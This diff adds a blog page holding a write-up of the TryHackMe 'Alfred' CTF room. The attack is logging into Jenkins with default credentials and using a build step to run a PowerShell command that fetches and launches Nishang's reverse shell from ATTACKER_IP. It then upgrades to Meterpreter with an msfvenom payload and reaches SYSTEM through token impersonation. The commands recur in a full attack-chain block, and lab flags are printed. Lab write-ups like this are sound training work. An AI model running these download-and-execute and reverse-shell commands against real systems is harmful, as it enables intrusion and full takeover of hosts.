@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Alfred | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Jenkins default credential login, build-step RCE via Nishang PowerShell reverse shell, Meterpreter upgrade, token impersonation to SYSTEM, process migration to root flag.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/alfred.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/alfred.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Alfred">
+<meta property="og:description" content="TryHackMe CTF: Jenkins default credential login, build-step RCE via Nishang PowerShell reverse shell, Meterpreter upgrade, token impersonation to SYSTEM, process migration to root flag.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Alfred">
+<meta name="twitter:description" content="TryHackMe CTF: Jenkins default credential login, build-step RCE via Nishang PowerShell reverse shell, Meterpreter upgrade, token impersonation to SYSTEM, process migration to root flag.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Alfred</h1>
+    <div class="post-description">TryHackMe CTF. Exploit Jenkins for an initial shell, then escalate through Windows authentication tokens to full system access.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Exploit Jenkins for an initial shell, then escalate through Windows authentication tokens to full system access.</p>
+
+<p>Jenkins is a widely used automation server for CI/CD pipelines. It&rsquo;s also widely misconfigured. This box doesn&rsquo;t respond to ping and takes a few minutes to boot.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<p>Two-prong port sweep.</p>
+
+<pre><code class="language-bash">sudo masscan TARGET_IP --ports 0-65535
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oN alfred_result.txt</code></pre>
+
+<p>masscan came back with nothing. nmap did the work.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.27.12 PM.png" alt="nmap results showing ports 80, 3389, and 8080 open" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong> 80, 3389, 8080. Three TCP ports open.</p>
+
+<p>On port 80, Batman&rsquo;s human doppelganger is dead. I noted the email address as a likely harvested credential:</p>
+
+<pre><code>alfred@wayneenterprises.com</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.31.37 PM.png" alt="port 80 webpage about Bruce Wayne with alfred@wayneenterprises.com visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Port 8080 serves Jenkins, and the URL redirected to a login:</p>
+
+<pre><code>http://TARGET_IP:8080/login?from=%2F</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.33.36 PM.png" alt="Jenkins login page on port 8080" style="max-width:100%;margin:2rem 0;">
+
+<p>I don&rsquo;t like to lay all my cards on the table too early, but duly noted.</p>
+
+<p>Inspecting the Jenkins login source, <code>j_acegi_security_check</code> and <code>j_password</code> catch my eye. Feels like default credentials. That&rsquo;s intuition, not fact yet.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.41.47 PM.png" alt="Jenkins login page source showing j_acegi_security_check and j_password field names" style="max-width:100%;margin:2rem 0;">
+
+<p>nmap also flagged <code>robots.txt</code> on 8080, which holds internal dev notes. The default-credentials hunch keeps getting stronger.</p>
+
+<p>A quick search engine query later, we&rsquo;re in. The usual default is <code>admin:password</code>, but this instance took <code>admin:admin</code>.</p>
+
+<p><strong>Login:</strong> <code>admin:admin</code></p>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.46.27 PM.png" alt="Jenkins dashboard after login with admin:admin" style="max-width:100%;margin:2rem 0;">
+
+<p>This is strangely reminiscent of 2008 Blogger.</p>
+
+<hr>
+
+<h2>Code execution through a build step</h2>
+
+<p>Now we find a feature that runs commands on the underlying system. Hold my beer.</p>
+
+<p>Jenkins automates CI/CD, so <code>Build History</code> is the most promising and on-brand feature. Click into <code>project #1</code> from 6 years ago, and the left pane gives us a winning menu.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 9.56.58 PM.png" alt="Jenkins project left pane showing Configure and Build Now options" style="max-width:100%;margin:2rem 0;">
+
+<p><code>Configure</code> reads as the most likely to execute commands, with <code>Build Now</code> as backup. At the bottom of Configure, the Build tool already has <code>whoami</code> typed in it. I did not type that.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-02 at 10.02.51 PM.png" alt="Jenkins Configure Build section showing Execute Windows batch command box with whoami pre-filled" style="max-width:100%;margin:2rem 0;">
+
+<p>The Build box executes a Windows batch command. A quick test confirms it: the build runs silently, but it runs. That&rsquo;s our execution point. I&rsquo;d normally capture the request through Burp here, but the path is clear enough to go straight to the reverse shell.</p>
+
+<p>This box uses Nishang&rsquo;s PowerShell reverse shell. Grab it on your local machine:</p>
+
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</code></pre>
+
+<p>The payload gets entered as a Jenkins Build command, in that same Execute Windows batch command box, then saved:</p>
+
+<pre><code class="language-bash">powershell -nop -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"</code></pre>
+
+<p>Before triggering it, set up the catch. Listener on the attacker box:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>And a Python server to host the script:</p>
+
+<pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+<p>Trigger the build. The orb next to the build number flashes, then the listener catches.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 6.12.24 AM.png" alt="netcat listener catching the Nishang reverse shell from the Jenkins build" style="max-width:100%;margin:2rem 0;">
+
+<p>Hah. Gotcha.</p>
+
+<p>The Jenkins workspace is empty, so head to Bruce&rsquo;s desktop:</p>
+
+<pre><code class="language-powershell">cd C:\Users\bruce\Desktop
+more user.txt</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 6.27.28 AM.png" alt="user.txt flag on Bruce's desktop" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>79007a09481963edf2e1321abd9ae2a0</code></p>
+
+<hr>
+
+<h2>Switching shells</h2>
+
+<p>We did the bait, now the switch. A Meterpreter session makes privesc much smoother, and variety is the spice of life. Leave the netcat listener and Python server running.</p>
+
+<p>New terminal, start Metasploit:</p>
+
+<pre><code class="language-bash">msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 5555
+run</code></pre>
+
+<p>Build the payload to call back:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=5555 -f exe -o shell.exe</code></pre>
+
+<p>In Bruce&rsquo;s shell, pull it down and run it:</p>
+
+<pre><code class="language-powershell">(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/shell.exe','C:\Users\bruce\Desktop\shell.exe')
+Start-Process C:\Users\bruce\Desktop\shell.exe</code></pre>
+
+<p>Meterpreter lands in the handler.</p>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 6.48.30 AM.png" alt="Meterpreter session opened in the multi/handler" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Privesc via token impersonation</h2>
+
+<p>Windows decides what an account can do using tokens, primary access tokens and impersonation tokens. It authenticates them through <code>LSASS.exe</code>.</p>
+
+<p>In Meterpreter, check who we are, load incognito, and list available group tokens:</p>
+
+<pre><code class="language-bash">getuid
+load incognito
+list_tokens -g</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 7.09.10 AM.png" alt="list_tokens -g showing BUILTIN\\Administrators available for impersonation" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re alfred/bruce, and the <code>BUILTIN\Administrators</code> token is available. Impersonate it:</p>
+
+<pre><code class="language-bash">impersonate_token "BUILTIN\Administrators"
+getuid</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 7.11.53 AM.png" alt="getuid returning NT AUTHORITY\\SYSTEM after impersonating BUILTIN\\Administrators" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re now <code>NT AUTHORITY\SYSTEM</code>. Good job, Jenn.</p>
+
+<p>The token works, but Windows&rsquo; most privileged users can&rsquo;t always run basic tasks cleanly. Best next move: migrate into a stable process already running as SYSTEM. List processes:</p>
+
+<pre><code class="language-bash">ps</code></pre>
+
+<p><code>services.exe</code> is the typical target, PID 668 here. Migrate:</p>
+
+<pre><code class="language-bash">migrate 668
+getuid</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 7.21.59 AM.png" alt="migrate 668 succeeding and getuid confirming NT AUTHORITY\\SYSTEM in services.exe" style="max-width:100%;margin:2rem 0;">
+
+<p>Right on track. Grab the flag:</p>
+
+<pre><code class="language-bash">cd C:\\Windows\\System32\\config
+cat root.txt</code></pre>
+
+<img src="/images/alfred/Screenshot 2026-06-03 at 7.23.50 AM.png" alt="root.txt flag in C:\\Windows\\System32\\config" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: <code>dff0f748678f280250f25a45b8046b4a</code></p>
+
+<p>Now close all 1100 terminal instances and go get some sunshine.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oN alfred_result.txt
+# Ports 80, 3389, 8080. 8080 = Jenkins.
+
+# 2. Jenkins login via default creds
+admin:admin
+
+# 3. Code execution through a build step (Configure -> Build, Windows batch)
+#    Host Nishang reverse shell, point the build command at it
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+python3 -m http.server 8000
+nc -lvnp 4444
+# build command:
+powershell -nop -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
+# -> shell as bruce, user.txt on the desktop
+
+# 4. Upgrade to Meterpreter
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 5555
+run
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=5555 -f exe -o shell.exe
+# download + Start-Process on target
+
+# 5. Privesc: token impersonation
+getuid
+load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"   # -> NT AUTHORITY\SYSTEM
+migrate 668                                    # services.exe, stable SYSTEM
+cd C:\Windows\System32\config
+cat root.txt</code></pre>
+
+<p>Recap: Jenkins default creds, build-step RCE, Nishang reverse shell, Meterpreter upgrade, token impersonation to SYSTEM, process migration, root flag.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
